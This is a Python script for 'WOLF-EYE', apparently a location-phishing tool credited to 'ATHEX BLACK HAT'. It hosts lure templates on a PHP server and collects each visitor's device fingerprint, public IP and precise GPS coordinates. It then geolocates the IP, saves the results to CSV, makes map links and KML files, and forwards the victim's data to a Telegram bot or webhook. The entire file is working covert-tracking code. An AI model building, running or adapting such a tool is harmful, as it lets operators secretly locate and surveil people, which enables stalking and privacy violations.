#!/usr/bin/env python3

VERSION = '1.0'

# Enhanced color scheme with more vibrant colors
R = '\033[91m'  # bright red
G = '\033[92m'  # bright green
C = '\033[96m'  # bright cyan
W = '\033[0m'   # white
Y = '\033[93m'  # bright yellow
B = '\033[94m'  # bright blue
M = '\033[95m'  # bright magenta
GR = '\033[90m' # gray
BL = '\033[1m'  # bold
DIM = '\033[2m' # dim
UND = '\033[4m' # underline
FLASH = '\033[5m' # flash
BG_R = '\033[41m' # background red
BG_G = '\033[42m' # background green
BG_B = '\033[44m' # background blue
BG_Y = '\033[43m' # background yellow
BG_M = '\033[45m' # background magenta

import sys
import utils
import argparse
import requests
import traceback
import shutil
from time import sleep
from os import path, kill, mkdir, getenv, environ, remove, devnull
from json import loads, decoder
from packaging import version

parser = argparse.ArgumentParser()
parser.add_argument('-k', '--kml', help='KML filename')
parser.add_argument(
    '-p', '--port', type=int, default=8080, help='Web server port [ Default : 8080 ]'
)
parser.add_argument('-u', '--update', action='store_true', help='Check for updates')
parser.add_argument('-v', '--version', action='store_true', help='Prints version')
parser.add_argument(
    '-t',
    '--template',
    type=int,
    help='Load template and loads parameters from env variables',
)
parser.add_argument(
    '-d',
    '--debugHTTP',
    type=bool,
    default=False,
    help='Disable HTTPS redirection for testing only',
)
parser.add_argument(
    '-tg', '--telegram', help='Telegram bot API token [ Format -> token:chatId ]'
)
parser.add_argument(
    '-wh', '--webhook', help='Webhook URL [ POST method & unauthenticated ]'
)

args = parser.parse_args()
kml_fname = args.kml
port = getenv('PORT') or args.port
chk_upd = args.update
print_v = args.version
telegram = getenv('TELEGRAM') or args.telegram
webhook = getenv('WEBHOOK') or args.webhook

if (
    getenv('DEBUG_HTTP')
    and (getenv('DEBUG_HTTP') == '1' or getenv('DEBUG_HTTP').lower() == 'true')
) or args.debugHTTP is True:
    environ['DEBUG_HTTP'] = '1'
else:
    environ['DEBUG_HTTP'] = '0'

templateNum = (
    int(getenv('TEMPLATE'))
    if getenv('TEMPLATE') and getenv('TEMPLATE').isnumeric()
    else args.template
)

path_to_script = path.dirname(path.realpath(__file__))

SITE = ''
SERVER_PROC = ''
LOG_DIR = f'{path_to_script}/logs'
DB_DIR = f'{path_to_script}/db'
LOG_FILE = f'{LOG_DIR}/php.log'
DATA_FILE = f'{DB_DIR}/results.csv'
INFO = f'{LOG_DIR}/info.txt'
RESULT = f'{LOG_DIR}/result.txt'
TEMPLATES_JSON = f'{path_to_script}/template/templates.json'
TEMP_KML = f'{path_to_script}/template/sample.kml'
META_FILE = f'{path_to_script}/metadata.json'
META_URL = 'https://raw.githubusercontent.com/wolf-intelligence-pk/WOLF-EYE/master/metadata.json'
PID_FILE = f'{path_to_script}/pid'

if not path.isdir(LOG_DIR):
    mkdir(LOG_DIR)

if not path.isdir(DB_DIR):
    mkdir(DB_DIR)

# Animated loading function
def animated_loading(message, duration=2, char="█"):
    print(f'\n{M}┌{"─" * 40}┐{W}')
    print(f'{M}│{W} {message}...')
    print(f'{M}└{"─" * 40}┘{W}')
    for i in range(20):
        bar = char * (i + 1)
        spaces = " " * (20 - i - 1)
        percentage = (i + 1) * 5
        print(f'\r{B}[{G}{bar}{GR}{spaces}{B}] {C}{percentage}%{W}', end='', flush=True)
        sleep(duration / 20)
    print()

# Animated spinner for processes
def spinner(message, duration=1.5):
    frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    for _ in range(int(duration * 5)):
        for frame in frames:
            print(f'\r{M}{frame} {C}{message}{W}', end='', flush=True)
            sleep(0.05)
    print()

# Cool divider
def cool_divider(char="═", width=50):
    print(f'{GR}╔{"═" * width}╗{W}')
    print(f'{GR}║{M} {char * width} {GR}║{W}')
    print(f'{GR}╚{"═" * width}╝{W}')

# Animated progress bar
def progress_bar(message, duration=1.2):
    print(f'\n{B}[*] {C}{message}{W}')
    for i in range(15):
        bar = "▓" * i + "░" * (14 - i)
        print(f'\r{G}  ╚{Y}{bar}{G}╝{W}', end='', flush=True)
        sleep(duration / 15)
    print()

def chk_update():
    try:
        cool_divider("✦", 30)
        print(f'{BL}  🔍  CHECKING FOR UPDATES{W}')
        cool_divider("✦", 30)
        spinner('Fetching Metadata...')
        rqst = requests.get(META_URL, timeout=5)
        meta_sc = rqst.status_code
        if meta_sc == 200:
            print(f'{G}  ✓ {C}Metadata fetched successfully!{W}')
            metadata = rqst.text
            json_data = loads(metadata)
            gh_version = json_data['version']
            if version.parse(gh_version) > version.parse(VERSION):
                print(f'\n{FLASH}{BG_Y}{R}  ⚡ NEW UPDATE AVAILABLE: {gh_version} ⚡  {W}\n')
                print(f'{Y}   Current: {R}{VERSION} {Y}→ Latest: {G}{gh_version}{W}')
            else:
                print(f'\n{G}   {W}Already up to date {G}(v{VERSION}){W}')
    except Exception as exc:
        print(f'\n{R}  ✗ Exception : {str(exc)}{W}')


if chk_upd is True:
    chk_update()
    sys.exit()

if print_v is True:
    print(f'\n{M}╔{"═" * 30}╗{W}')
    print(f'{M}║{BL}  WOLF-EYE v{VERSION}{M}     ║{W}')
    print(f'{M}╚{"═" * 30}╝{W}')
    sys.exit()

import socket
import importlib
from csv import writer
import subprocess as subp
from ipaddress import ip_address
from signal import SIGTERM

# temporary workaround for psutil exception on termux
with open(devnull, 'w') as nf:
    sys.stderr = nf
    import psutil
sys.stderr = sys.__stderr__


def banner():
    with open(META_FILE, 'r') as metadata:
        json_data = loads(metadata.read())
        youtube_url = json_data['youtube']
        comms_url = json_data['comms']

    # Animated banner display
    art = r"""
  
                                                      
         ██╗    ██╗ ██████╗ ██╗     ███████╗          
         ██║    ██║██╔═══██╗██║     ██╔════╝          
         ██║ █╗ ██║██║   ██║██║     █████╗            
         ██║███╗██║██║   ██║██║     ██╔══╝            
         ╚███╔███╔╝╚██████╔╝███████╗██║               
          ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝               
                                                      
         ███████╗██╗   ██╗███████╗                    
         ██╔════╝╚██╗ ██╔╝██╔════╝                    
         █████╗   ╚████╔╝ █████╗                      
         ██╔══╝    ╚██╔╝  ██╔══╝                      
         ███████╗   ██║   ███████╗                    
         ╚══════╝   ╚═╝   ╚══════╝                    
                                                      
    """
    
    # Print border glow effect
    for i in range(3):
        print(f'{B}{art}{W}')
        sleep(0.05)
        if i < 2:
            print('\033[3A')  # Move cursor up
    
    sleep(0.2)
    print(f'\n{G}  {"═" * 50}╗{W}')
    print(f'{G}  {C}  👤 Created By   : {W}{BL}ATHEX BLACK HAT{G}          {W}')
    print(f'{G}  {C}  📺 YOUTUBE     : {W}{UND}{youtube_url}{W}{G} {W}')
    print(f'{G}  {C}  🌐 Community   : {W}{UND}{comms_url}{W}{G} {W}')
    print(f'{G}  {C}  📌 Version      : {W}{BL}v{VERSION}{G}                         {W}')
    print(f'{G}  {"═" * 50}{W}\n')


def send_webhook(content, msg_type):
    if webhook is not None:
        if not webhook.lower().startswith('http://') and not webhook.lower().startswith(
            'https://'
        ):
            print(f'{R}  ✗ {C}Protocol missing, include http:// or https://{W}')
            return
        if webhook.lower().startswith('https://discord.com/api/webhooks'):
            from discord_webhook import discord_sender
            progress_bar('Sending Discord notification...')
            discord_sender(webhook, msg_type, content)
        else:
            progress_bar('Sending Webhook...')
            requests.post(webhook, json=content)
        print(f'{G}  ✓ Notification sent!{W}')


def send_telegram(content, msg_type):
    if telegram is not None:
        tmpsplit = telegram.split(':')
        if len(tmpsplit) < 3:
            print(f'{R}  ✗ {C}Telegram API token invalid! Format -> token:chatId{W}')
            return
        from telegram_api import tgram_sender
        progress_bar('Sending Telegram message...')
        tgram_sender(msg_type, content, tmpsplit)
        print(f'{G}  ✓ Telegram notification sent!{W}')


def template_select(site):
    cool_divider("✧", 30)
    print(f'\n{Y}    SELECT TEMPLATE{W}\n')
    cool_divider("✧", 30)

    with open(TEMPLATES_JSON, 'r') as templ:
        templ_info = templ.read()

    templ_json = loads(templ_info)

    for item in templ_json['templates']:
        name = item['name']
        idx = templ_json["templates"].index(item)
        print(f'{G}  [{M}{idx}{G}] {C}➤ {W}{name}')

    try:
        selected = -1
        if templateNum is not None:
            if templateNum >= 0 and templateNum < len(templ_json['templates']):
                selected = templateNum
        else:
            print(f'\n{Y}  ═══>{W} ', end='')
            selected = int(input())
        if selected < 0:
            print(f'\n{R}  ✗ Invalid Input!{W}')
            sys.exit()
    except ValueError:
        print(f'\n{R}  ✗ Invalid Input!{W}')
        sys.exit()

    try:
        site = templ_json['templates'][selected]['dir_name']
    except IndexError:
        print(f'\n{R}  ✗ Invalid Input!{W}')
        sys.exit()

    print()
    animated_loading(f'Loading {templ_json["templates"][selected]["name"]} Template')
    print(f'{G}  ✓ {C}Template loaded successfully!{W}')

    imp_file = templ_json['templates'][selected]['import_file']
    importlib.import_module(f'template.{imp_file}')
    shutil.copyfile(
        'php/error.php',
        f'template/{templ_json["templates"][selected]["dir_name"]}/error_handler.php',
    )
    shutil.copyfile(
        'php/info.php',
        f'template/{templ_json["templates"][selected]["dir_name"]}/info_handler.php',
    )
    shutil.copyfile(
        'php/result.php',
        f'template/{templ_json["templates"][selected]["dir_name"]}/result_handler.php',
    )
    jsdir = f'template/{templ_json["templates"][selected]["dir_name"]}/js'
    if not path.isdir(jsdir):
        mkdir(jsdir)
    shutil.copyfile('js/location.js', jsdir + '/location.js')
    return site


def server():
    print()
    port_free = False
    cool_divider("⚡", 30)
    print(f'{B}  🌐  STARTING SERVER{W}')
    cool_divider("⚡", 30)
    
    print(f'\n{G}  ╭─{C} Port : {W}{port}')
    spinner('Initializing PHP Server...')
    cmd = ['php', '-S', f'0.0.0.0:{port}', '-t', f'template/{SITE}/']

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        try:
            sock.connect(('127.0.0.1', port))
        except ConnectionRefusedError:
            port_free = True

    if not port_free and path.exists(PID_FILE):
        with open(PID_FILE, 'r') as pid_info:
            pid = int(pid_info.read().strip())
            try:
                old_proc = psutil.Process(pid)
                print(f'\n{Y}  ⚠ Old PHP server instance found!{W}')
                spinner('Restarting server...')
                try:
                    sleep(1)
                    if old_proc.status() != 'running':
                        old_proc.kill()
                    else:
                        print(f'{R}  ✗ Unable to kill PHP server, kill manually{W}')
                        sys.exit()
                except psutil.NoSuchProcess:
                    pass
            except psutil.NoSuchProcess:
                print(f'{R}  ✗ Port {port} in use by another service{W}')
                sys.exit()
    elif not port_free and not path.exists(PID_FILE):
        print(f'{R}  ✗ Port {port} in use by another service{W}')
        sys.exit()
    elif port_free:
        pass

    with open(LOG_FILE, 'w') as phplog:
        proc = subp.Popen(cmd, stdout=phplog, stderr=phplog)
        with open(PID_FILE, 'w') as pid_out:
            pid_out.write(str(proc.pid))

        sleep(3)

        try:
            php_rqst = requests.get(f'http://127.0.0.1:{port}/index.html')
            php_sc = php_rqst.status_code
            if php_sc == 200:
                print(f'\n{G}  {"━" * 30}{W}')
                print(f'{G}   SERVER RUNNING SUCCESSFULLY!{W}')
                print(f'{G}  {"━" * 30}{W}')
                print(f'{C}   Local: {W}http://127.0.0.1:{port}')
                print()
            else:
                print(f'{R}  ✗ Server Error [Status: {php_sc}]{W}')
                cl_quit()
        except requests.ConnectionError:
            print(f'{R}  ✗ Connection failed!{W}')
            cl_quit()


def wait():
    printed = False
    # Animated waiting indicator
    dots_frames = ["⠋ Waiting for Client.", "⠙ Waiting for Client..", "⠹ Waiting for Client...", 
                   "⠸ Waiting for Client.", "⠼ Waiting for Client..", "⠴ Waiting for Client..."]
    
    frame_idx = 0
    while True:
        sleep(2)
        size = path.getsize(RESULT)
        if size == 0 and printed is False:
            print(f'\n{G}  {"━" * 40}{W}')
            print(f'{M}  {dots_frames[frame_idx]} {Y}[ctrl+c to exit]{W}')
            print(f'{G}  {"━" * 40}{W}\n')
            printed = True
        if size > 0:
            print(f'\n{G}  ✨ Client detected! Processing data...{W}\n')
            data_parser()
            printed = False
        
        if printed:
            frame_idx = (frame_idx + 1) % len(dots_frames)


def data_parser():
    data_row = []
    with open(INFO, 'r') as info_file:
        info_content = info_file.read()
    if not info_content or info_content.strip() == '':
        return
    try:
        info_json = loads(info_content)
    except decoder.JSONDecodeError:
        print(f'{R}  ✗ Exception : {R}{traceback.format_exc()}{W}')
    else:
        var_os = info_json['os']
        var_platform = info_json['platform']
        var_cores = info_json['cores']
        var_ram = info_json['ram']
        var_vendor = info_json['vendor']
        var_render = info_json['render']
        var_res = info_json['wd'] + 'x' + info_json['ht']
        var_browser = info_json['browser']
        var_ip = info_json['ip']

        data_row.extend(
            [
                var_os,
                var_platform,
                var_cores,
                var_ram,
                var_vendor,
                var_render,
                var_res,
                var_browser,
                var_ip,
            ]
        )
        
        # Stylish device info display
        print(f'\n{BG_B}{W}  📱 DEVICE INFORMATION  {W}\n')
        device_info = f"""{G}  
{G}  {C} 💻 OS         : {W}{var_os:<20}{G} 
{G}  {C} 🖥  Platform   : {W}{var_platform:<20}{G} 
{G}  {C} ⚙️ CPU Cores  : {W}{var_cores:<20}{G} 
{G}  {C} 🧠 RAM        : {W}{var_ram:<20}{G} 
{G}  {C} 🎮 GPU Vendor : {W}{var_vendor:<20}{G} 
{G}  {C} 🎨 GPU        : {W}{var_render:<20}{G} 
{G}  {C} 📐 Resolution : {W}{var_res:<20}{G} 
{G}  {C} 🌐 Browser    : {W}{var_browser:<20}{G} 
{G}  {C} 📍  Public IP  : {W}{var_ip:<20}{G} 
{G}  {W}
"""
        utils.print(device_info)
        send_telegram(info_json, 'device_info')
        send_webhook(info_json, 'device_info')

        if ip_address(var_ip).is_private:
            print(f'{Y}  ⓘ  Skipping IP recon (Private IP){W}')
        else:
            spinner('Performing IP reconnaissance...')
            rqst = requests.get(f'https://ipwhois.app/json/{var_ip}')
            s_code = rqst.status_code

            if s_code == 200:
                data = rqst.text
                data = loads(data)
                var_continent = str(data['continent'])
                var_country = str(data['country'])
                var_region = str(data['region'])
                var_city = str(data['city'])
                var_org = str(data['org'])
                var_isp = str(data['isp'])

                data_row.extend(
                    [var_continent, var_country, var_region, var_city, var_org, var_isp]
                )
                
                # Stylish IP info display
                print(f'\n{BG_M}{W}  🌍 IP INFORMATION  {W}\n')
                ip_info = f"""{G} 
{G}  {C} 🌎 Continent : {W}{var_continent:<20}{G} 
{G}  {C} 🏳  Country   : {W}{var_country:<20}{G} 
{G}  {C} 🗺  Region    : {W}{var_region:<20}{G} 
{G}  {C} 🏙  City      : {W}{var_city:<20}{G} 
{G}  {C} 🏢 Org       : {W}{var_org:<20}{G} 
{G}  {C} 📡 ISP       : {W}{var_isp:<20}{G} 
{G}  {W}
"""
                utils.print(ip_info)
                send_telegram(data, 'ip_info')
                send_webhook(data, 'ip_info')

    with open(RESULT, 'r') as result_file:
        results = result_file.read()
        try:
            result_json = loads(results)
        except decoder.JSONDecodeError:
            print(f'{R}  ✗ Exception : {R}{traceback.format_exc()}{W}')
        else:
            status = result_json['status']
            if status == 'success':
                var_lat = result_json['lat']
                var_lon = result_json['lon']
                var_acc = result_json['acc']
                var_alt = result_json['alt']
                var_dir = result_json['dir']
                var_spd = result_json['spd']

                data_row.extend([var_lat, var_lon, var_acc, var_alt, var_dir, var_spd])
                
                # Stylish location display
                print(f'\n{BG_G}{W}  📍 LOCATION INFORMATION  {W}\n')
                loc_info = f"""{G}  
{G}  {C} 🎯 Latitude  : {W}{var_lat:<20}{G} 
{G}  {C} 🎯 Longitude : {W}{var_lon:<20}{G} 
{G}  {C} 📊 Accuracy  : {W}{var_acc:<20}{G} 
{G}  {C} ⬆️  Altitude  : {W}{var_alt:<20}{G} 
{G}  {C} 🧭 Direction : {W}{var_dir:<20}{G} 
{G}  {C} ⚡ Speed     : {W}{var_spd:<20}{G} 
{G}  {W}
"""
                utils.print(loc_info)
                send_telegram(result_json, 'location')
                send_webhook(result_json, 'location')
                
                gmaps_url = f'\n{G}  ╔{"═" * 60}╗{W}'
                gmaps_url += f'\n{G}  ║ {C}🗺  Google Maps : {W}{UND}https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}{W}{G} ║'
                gmaps_url += f'\n{G}  ╚{"═" * 60}╝{W}'
                gmaps_json = {
                    'url': f'https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}'
                }
                utils.print(gmaps_url)
                send_telegram(gmaps_json, 'url')
                send_webhook(gmaps_json, 'url')

                if kml_fname is not None:
                    kmlout(var_lat, var_lon)
            else:
                var_err = result_json['error']
                print(f'\n{R}  ╔{"═" * 40}╗{W}')
                print(f'{R}  ║  ✗ ERROR: {var_err}{" " * (30 - len(var_err))}║{W}')
                print(f'{R}  ╚{"═" * 40}╝{W}\n')
                send_telegram(result_json, 'error')
                send_webhook(result_json, 'error')

    csvout(data_row)
    clear()
    return


def kmlout(var_lat, var_lon):
    with open(TEMP_KML, 'r') as kml_sample:
        kml_sample_data = kml_sample.read()

    kml_sample_data = kml_sample_data.replace('LONGITUDE', var_lon.strip(' deg'))
    kml_sample_data = kml_sample_data.replace('LATITUDE', var_lat.strip(' deg'))

    with open(f'{path_to_script}/{kml_fname}.kml', 'w') as kml_gen:
        kml_gen.write(kml_sample_data)

    print(f'\n{G}  ╔{"═" * 50}╗{W}')
    print(f'{G}  ║{Y}   KML File Generated!{" " * 23}{G}║{W}')
    print(f'{G}  ║{C}   Path : {W}{path_to_script}/{kml_fname}.kml{G} ║{W}')
    print(f'{G}  ╚{"═" * 50}╝{W}\n')


def csvout(row):
    with open(DATA_FILE, 'a') as csvfile:
        csvwriter = writer(csvfile)
        csvwriter.writerow(row)
    print(f'{G}  Data Saved : {W}{path_to_script}/db/results.csv\n')


def clear():
    with open(RESULT, 'w+'):
        pass
    with open(INFO, 'w+'):
        pass


def repeat():
    clear()
    wait()


def cl_quit():
    if not path.isfile(PID_FILE):
        return
    
    print(f'\n{Y}  {"━" * 30}{W}')
    print(f'{R}  🛑 SHUTTING DOWN...{W}')
    print(f'{Y}  {"━" * 30}{W}\n')
    
    with open(PID_FILE, 'r') as pid_info:
        pid = int(pid_info.read().strip())
        kill(pid, SIGTERM)
    remove(PID_FILE)
    
    # Exit animation
    frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    for _ in range(2):
        for frame in frames:
            print(f'\r{M}{frame} {C}Goodbye!{W}', end='', flush=True)
            sleep(0.05)
    print(f'\n{G}  ✓ Done!{W}\n')
    
    sys.exit()


try:
    banner()
    clear()
    SITE = template_select(SITE)
    server()
    wait()
    data_parser()
except KeyboardInterrupt:
    print(f'\n{Y}  ═{"═" * 30}═{W}')
    print(f'{R}  ⌨  Keyboard Interrupt{W}')
    print(f'{Y}  ═{"═" * 30}═{W}')
    cl_quit()
else:
    repeat()